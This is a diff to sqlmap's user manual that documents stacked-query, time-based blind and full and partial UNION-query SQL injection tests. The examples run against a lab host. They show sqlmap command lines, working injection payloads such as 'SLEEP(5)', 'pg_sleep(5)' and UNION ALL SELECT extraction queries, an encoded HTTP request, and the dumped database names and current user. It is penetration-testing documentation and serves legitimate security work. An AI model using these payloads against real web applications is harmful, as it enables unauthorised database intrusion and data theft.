@@ -403,6 +403,7 @@ Options:
     or to use one of them to exploit the affected parameter(s) rather than
     using the default blind SQL injection technique.
 
+    --stacked-test      Test for stacked queries (multiple statements) support
     --time-test         Test for Time based blind SQL injection
     --union-test        Test for UNION query (inband) SQL injection
     --union-use         Use the UNION query (inband) SQL injection to retrieve
@@ -1742,13 +1743,101 @@ stability test.
 
 <sect1>Techniques
 
+<sect2>Test for stacked queries (multiple statements) support
+
+<p>
+Option: <tt>--stacked-test</tt>
+
+<p>
+It is possible to test if the web application technology supports
+<bf>stacked queries</bf>, multiple statements, on the injectable
+parameter.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
+  --stacked-test -v 1
+
+[...]
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:15] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:15] [WARNING] the web application does not support stacked queries on parameter 'id'
+stacked queries support:	None
+</verb></tscreen>
+
+<p>
+By default PHP builtin function <tt>mysql_query()</tt> does not support
+multiple statements.
+Multiple statements is a feature supported by default only by some
+web application technologies in relation to the back-end database
+management system. For instance, as you can see from the next example,
+where PHP does not support them on MySQL, it does on PostgreSQL.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
+  --stacked-test -v 1
+
+[...]
+back-end DBMS: PostgreSQL
+
+[hh:mm:01] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:06] [INFO] the web application supports stacked queries on parameter 'id'
+stacked queries support:    'id=1; SELECT pg_sleep(5);-- AND 3128=3128'
+</verb></tscreen>
+
+
 <sect2>Test for Time based blind SQL injection
 
 <p>
 Option: <tt>--time-test</tt>
 
 <p>
-TODO
+It is possible to test if the target URL is affected by a <bf>Time based
+blind SQL injection</bf> vulnerability.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
+  --time-test -v 1
+
+[...]
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:05] [INFO] testing time based blind sql injection on parameter 'id' with AND 
+condition syntax
+[hh:mm:10] [INFO] the parameter 'id' is affected by a time based blind sql injection 
+with AND condition syntax
+time based blind sql injection payload:    'id=1 AND SLEEP(5) AND 5249=5249'
+</verb></tscreen>
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
+  --time-test -v 1
+
+[...]
+back-end DBMS: PostgreSQL
+
+[hh:mm:30] [INFO] testing time based blind sql injection on parameter 'id' with AND 
+condition syntax
+[hh:mm:30] [WARNING] the parameter 'id' is not affected by a time based blind sql 
+injection with AND condition syntax
+[hh:mm:30] [INFO] testing time based blind sql injection on parameter 'id' with stacked 
+query syntax
+[hh:mm:35] [INFO] the parameter 'id' is affected by a time based blind sql injection 
+with stacked query syntax
+time based blind sql injection payload:    'id=1; SELECT pg_sleep(5);-- AND 9644=9644'
+</verb></tscreen>
 
 
 <sect2>Test for UNION query SQL injection
@@ -1818,6 +1907,9 @@ exploiting.
 If the confirmation fails, it will check if the parameter is affected by
 a <bf>Partial UNION query SQL injection</bf>, then use it to go ahead if it
 is vulnerable.
+In case the inband SQL injection vulnerability is not exploitable, sqlmap
+will automatically fallback on the blind SQL injection technique to go
+ahead.
 
 <p>
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
@@ -1858,18 +1950,19 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 \
-  --union-use --banner
+  --union-use --current-user
 
 [...]
-[hh:mm:25] [INFO] the target url is affected by an exploitable full inband sql injection 
-vulnerability
-[hh:mm:25] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(98,108,76,79,106,78),
-VERSION(),CHAR(122,110,105,89,121,65)), NULL# AND 6043=6043
-[hh:mm:25] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28CHAR%2898
-%2C108%2C76%2C79%2C106%2C78%29%2CIFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%2810000%29%29
-%2C%20CHAR%2832%29%29%2CCHAR%28122%2C110%2C105%2C89%2C121%2C65%29%29%2C%20NULL%23%20AND%2
-06043=6043 HTTP/1.1
+[hh:mm:29] [INFO] the target url is affected by an exploitable full inband sql 
+injection vulnerability
+[hh:mm:29] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(112,110,121,77,88,86),
+IFNULL(CAST(CURRENT_USER() AS CHAR(10000)), CHAR(32)),CHAR(72,89,75,77,121,103)), 
+NULL# AND 8032=8032
+[hh:mm:29] [TRAFFIC OUT] HTTP request:
+GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28CHAR%28112
+%2C110%2C121%2C77%2C88%2C86%29%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%2810000%29
+%29%2C%20CHAR%2832%29%29%2CCHAR%2872%2C89%2C75%2C77%2C121%2C103%29%29%2C%20NULL%23%20AND
+%208032=8032 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
 Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
@@ -1878,11 +1971,11 @@ image/png,*/*;q=0.5
 User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
-[hh:mm:25] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Mon, 28 Jul 2008 22:34:25 GMT
-Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.2 with Suhosin-Patch mod_ssl/2.2.8 
-OpenSSL/0.9.8g mod_perl/2.0.3 Perl/v5.8.8
-X-Powered-By: PHP/5.2.4-2ubuntu5.2
+[hh:mm:29] [TRAFFIC IN] HTTP response (OK - 200):
+Date: Tue, 16 Dec 2008 hh:mm:29 GMT
+Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4 with Suhosin-Patch mod_ssl/2.2.9 
+OpenSSL/0.9.8g mod_perl/2.0.4 Perl/v5.10.0
+X-Powered-By: PHP/5.2.6-2ubuntu4
 Content-Length: 194
 Connection: close
 Content-Type: text/html
@@ -1891,21 +1984,80 @@ Content-Type: text/html
 &lt;b&gt;SQL results:&lt;/b&gt;
 &lt;table border="1"&gt;
 &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;luther&lt;/td&gt;&lt;td&gt;blissett&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;FPMIFA5.0.67-0ubuntu6zFQAiQ&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;pnyMXVtestuser@localhostHYKMyg&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;
 
-[hh:mm:25] [INFO] performed 3 queries in 0 seconds
-banner:    '5.0.67-0ubuntu6'
+[hh:mm:29] [INFO] performed 3 queries in 0 seconds
+current user:    'testuser@localhost'
 </verb></tscreen>
 
 <p>
-As you can see, the MySQL <tt>version()</tt> function (banner) output is
-nested (inband) within the HTTP response page, this makes the inband SQL
-injection exploitable.
+As you can see, the MySQL <tt>CURRENT_USER()</tt> function (--current-user)
+output is nested, inband, within the HTTP response page, this makes the
+inband SQL injection exploited.
 
 <p>
-TODO: details on partial ...
+In case the inband SQL injection is not fully exploitable, sqlmap will
+check if it is partially exploitable: this occurs if the query output
+is not parsed within a <tt>for</tt>, or similar, cycle but only the first
+entry is displayed in the page content.
+
+<p>
+Example on a <bf>MySQL 5.0.67</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 \
+  --union-use --dbs
+
+[...]
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:56] [INFO] fetching database names
+[hh:mm:56] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:56] [INFO] the target url could be affected by an inband sql injection vulnerability
+[hh:mm:56] [INFO] confirming full inband sql injection on parameter 'id'
+[hh:mm:56] [WARNING] the target url is not affected by an exploitable full inband sql 
+injection vulnerability
+[hh:mm:56] [INFO] confirming partial inband sql injection on parameter 'id'
+[hh:mm:56] [INFO] the target url is affected by an exploitable partial inband sql injection 
+vulnerability
+[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),
+IFNULL(CAST(COUNT(schema_name) AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL 
+FROM information_schema.SCHEMATA# AND 1062=1062
+[hh:mm:56] [INFO] performed 6 queries in 0 seconds
+[hh:mm:56] [INFO] the SQL query provided returns 4 entries
+[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
+information_schema.SCHEMATA LIMIT 0, 1# AND 1421=1421
+[hh:mm:56] [INFO] performed 7 queries in 0 seconds
+[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
+information_schema.SCHEMATA LIMIT 1, 1# AND 9553=9553
+[hh:mm:56] [INFO] performed 8 queries in 0 seconds
+[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
+information_schema.SCHEMATA LIMIT 2, 1# AND 6805=6805
+[hh:mm:56] [INFO] performed 9 queries in 0 seconds
+[hh:mm:56] [INFO] query:  UNION ALL SELECT NULL, CONCAT(CHAR(90,121,78,99,122,76),IFNULL(
+CAST(schema_name AS CHAR(10000)), CHAR(32)),CHAR(110,97,105,116,84,120)), NULL FROM 
+information_schema.SCHEMATA LIMIT 3, 1# AND 739=739
+[hh:mm:56] [INFO] performed 10 queries in 0 seconds
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] privatedb
+[*] test
+</verb></tscreen>
+
+<p>
+As you can see, sqlmap identified that the parameter is affected by a
+partial inband SQL injection, consequently counted the number of query
+output entries and retrieved once per time by forcing the parameter
+(<tt>id</tt>) value <tt>1</tt> to its negative value <tt>-1</tt> so that
+it does not returns, presumibly, any output leaving our own <tt>UNION ALL
+SELECT</tt> statement to produce one entry at a time and display it in the
+page content.
 
 
 <sect1>Fingerprint
@@ -2673,14 +2825,14 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --col
 [...]
 back-end DBMS: MySQL >= 5.0.0
 
-[15:54:25] [WARNING] missing database parameter, sqlmap is going to use the current 
+[hh:mm:25] [WARNING] missing database parameter, sqlmap is going to use the current 
 database to enumerate table 'users' columns
-[15:54:25] [INFO] fetching current database
-[15:54:25] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
-[15:54:25] [INFO] retrieved: test
-[15:54:25] [INFO] performed 34 queries in 0 seconds
-[15:54:25] [INFO] fetching columns for table 'users' on database 'test'
-[15:54:25] [INFO] fetching number of columns for table 'users' on database 'test'
+[hh:mm:25] [INFO] fetching current database
+[hh:mm:25] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
+[hh:mm:25] [INFO] retrieved: test
+[hh:mm:25] [INFO] performed 34 queries in 0 seconds
+[hh:mm:25] [INFO] fetching columns for table 'users' on database 'test'
+[hh:mm:25] [INFO] fetching number of columns for table 'users' on database 'test'
 [...]
 Database: test
 Table: users
